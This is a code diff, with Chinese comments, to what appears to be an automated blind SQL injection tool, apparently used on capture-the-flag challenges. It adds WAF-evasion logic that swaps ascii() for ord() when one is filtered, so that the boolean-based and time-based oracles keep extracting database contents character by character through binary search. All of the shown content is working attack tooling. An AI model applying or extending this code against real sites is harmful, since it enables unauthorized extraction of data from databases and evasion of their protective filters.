@@ -50,6 +50,31 @@ class BaseOracle:
             return f"substr(({expr})from {pos} for 1)"
         return f"substr(({expr}),{pos},1)"
 
+    def code_expr(self, expr: str) -> str:
+        """码点函数表达式；主函数被 WAF 过滤时自动换等价函数。
+
+        web191 实测：ascii 被 preg_match 拦掉后，ord() 完全等价却把整个盲注
+        通道判死。这里按「主函数 → 等价函数」顺序挑一个可用的。
+        """
+        fn = self.dialect.blind_code
+        if self.waf.is_filtered(fn):
+            alts = {"ascii": ("ord",), "ord": ("ascii",), "unicode": ("hex",)}
+            for alt in alts.get(fn, ()):
+                if not self.waf.is_filtered(alt):
+                    fn = alt
+                    break
+        if fn == "hex":
+            # hex() 返回十六进制串，不能直接做码点比较 → 维持原函数
+            fn = self.dialect.blind_code
+        return f"{fn}({expr})"
+
+    def code_available(self) -> bool:
+        """码点函数是否可用（主函数或等价函数至少一个未被拦）。"""
+        if not self.waf.is_filtered(self.dialect.blind_code):
+            return True
+        alt = {"ascii": "ord", "ord": "ascii"}.get(self.dialect.blind_code)
+        return bool(alt and not self.waf.is_filtered(alt))
+
     def scalar_int(self, expr: str) -> int:
         v = self.scalar(expr).strip()
         m = re.search(r"-?\d+", v)
@@ -270,10 +295,10 @@ class BoolOracle(BaseOracle):
             eq = "=" if not self.waf.is_filtered("=") else " like "
             a = self._substr_at(expr, pos)
             b = self._substr_at(expr, pos - 1)
-            if self.eval_bool(f"ascii({a}){eq}ascii({b})"):
+            if self.eval_bool(f"{self.code_expr(a)}{eq}{self.code_expr(b)}"):
                 return prev
         code = self._binsearch(
-            lambda m: f"{self.dialect.blind_code}({self._substr_at(expr, pos)})>={m}", 32, 126)
+            lambda m: f"{self.code_expr(self._substr_at(expr, pos))}>={m}", 32, 126)
         return chr(code)
 
     def _extract_block(self, expr: str, start: int, end: int) -> str:
@@ -290,7 +315,7 @@ class BoolOracle(BaseOracle):
 
     def scalar(self, expr: str) -> str:
         # 按方言实际使用判定（ord 被拦不影响 ascii 通道）
-        if self.waf.is_filtered(self.dialect.blind_code) \
+        if not self.code_available() \
                 or self.waf.is_filtered("length") \
                 or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
             raise OracleError("码点/截取/定长函数被过滤，布尔通道不可用")
@@ -478,7 +503,7 @@ class TimeOracle(BaseOracle):
         return lo
 
     def scalar(self, expr: str) -> str:
-        if self.waf.is_filtered(self.dialect.blind_code) \
+        if not self.code_available() \
                 or self.waf.is_filtered("length") \
                 or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
             raise OracleError("码点/截取/定长函数被过滤，时间通道不可用")
@@ -495,11 +520,11 @@ class TimeOracle(BaseOracle):
                 eq = "=" if not self.waf.is_filtered("=") else " like "
                 a = self._substr_at(expr, p)
                 b = self._substr_at(expr, p - 1)
-                if self.eval_bool(f"ascii({a}){eq}ascii({b})"):
+                if self.eval_bool(f"{self.code_expr(a)}{eq}{self.code_expr(b)}"):
                     out.append(prev)
                     continue
             code = self._binsearch(
-                lambda m: f"{self.dialect.blind_code}({self._substr_at(expr, p)})>={m}", 32, 126)
+                lambda m: f"{self.code_expr(self._substr_at(expr, p))}>={m}", 32, 126)
             ch = chr(code)
             out.append(ch)
             prev = ch or None
